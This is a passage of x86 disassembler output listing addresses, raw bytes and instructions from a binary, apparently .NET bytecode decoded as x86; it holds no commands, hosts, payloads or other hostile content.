  404cec:	1b 08                	sbb    (%eax),%ecx
  404cee:	14 72                	adc    $0x72,%al
  404cf0:	b3 15                	mov    $0x15,%bl
  404cf2:	00 70 16             	add    %dh,0x16(%eax)
  404cf5:	8d 03                	lea    (%ebx),%eax
  404cf7:	00 00                	add    %al,(%eax)
  404cf9:	01 14 14             	add    %edx,(%esp,%edx,1)
  404cfc:	14 28                	adc    $0x28,%al
  404cfe:	c2 00 00             	ret    $0x0
  404d01:	0a 28                	or     (%eax),%ch
  404d03:	22 00                	and    (%eax),%al
  404d05:	00 0a                	add    %cl,(%edx)
  404d07:	0c 11                	or     $0x11,%al
  404d09:	04 28                	add    $0x28,%al
  404d0b:	f7 00 00 0a 1f 70    	testl  $0x701f0a00,(%eax)
  404d11:	32 2f                	xor    (%edi),%ch
  404d13:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404d16:	f7 00 00 0a 20 87    	testl  $0x87200a00,(%eax)
  404d1c:	00 00                	add    %al,(%eax)
  404d1e:	00 30                	add    %dh,(%eax)
  404d20:	21 72 e2             	and    %esi,-0x1e(%edx)
  404d23:	22 00                	and    (%eax),%al
  404d25:	70 11                	jo     0x404d38
  404d27:	04 28                	add    $0x28,%al
  404d29:	f7 00 00 0a 28 8a    	testl  $0x8a280a00,(%eax)
  404d2f:	00 00                	add    %al,(%eax)
  404d31:	0a 72 d1             	or     -0x2f(%edx),%dh
  404d34:	15 00 70 28 39       	adc    $0x39287000,%eax
  404d39:	00 00                	add    %al,(%eax)
  404d3b:	0a 0c 38             	or     (%eax,%edi,1),%cl
  404d3e:	42                   	inc    %edx
  404d3f:	01 00                	add    %eax,(%eax)
  404d41:	00 11                	add    %dl,(%ecx)
  404d43:	04 28                	add    $0x28,%al
  404d45:	f7 00 00 0a 8c 90    	testl  $0x908c0a00,(%eax)
  404d4b:	00 00                	add    %al,(%eax)
  404d4d:	01 6f f8             	add    %ebp,-0x8(%edi)
  404d50:	00 00                	add    %al,(%eax)
  404d52:	0a 13                	or     (%ebx),%dl
  404d54:	06                   	push   %es
  404d55:	11 06                	adc    %eax,(%esi)
  404d57:	72 e6                	jb     0x404d3f
  404d59:	22 00                	and    (%eax),%al
  404d5b:	70 16                	jo     0x404d73
  404d5d:	28 60 00             	sub    %ah,0x0(%eax)
  404d60:	00 0a                	add    %cl,(%edx)
  404d62:	16                   	push   %ss
  404d63:	33 0b                	xor    (%ebx),%ecx
  404d65:	72 f2                	jb     0x404d59
  404d67:	22 00                	and    (%eax),%al
  404d69:	70 0c                	jo     0x404d77
  404d6b:	38 14 01             	cmp    %dl,(%ecx,%eax,1)
  404d6e:	00 00                	add    %al,(%eax)
  404d70:	11 06                	adc    %eax,(%esi)
  404d72:	72 02                	jb     0x404d76
  404d74:	23 00                	and    (%eax),%eax
  404d76:	70 16                	jo     0x404d8e
  404d78:	28 60 00             	sub    %ah,0x0(%eax)
  404d7b:	00 0a                	add    %cl,(%edx)
  404d7d:	16                   	push   %ss
  404d7e:	33 0b                	xor    (%ebx),%ecx
  404d80:	72 10                	jb     0x404d92
  404d82:	23 00                	and    (%eax),%eax
  404d84:	70 0c                	jo     0x404d92
  404d86:	38 f9                	cmp    %bh,%cl
  404d88:	00 00                	add    %al,(%eax)
  404d8a:	00 11                	add    %dl,(%ecx)
  404d8c:	06                   	push   %es
  404d8d:	72 20                	jb     0x404daf
  404d8f:	23 00                	and    (%eax),%eax
  404d91:	70 16                	jo     0x404da9
  404d93:	28 60 00             	sub    %ah,0x0(%eax)
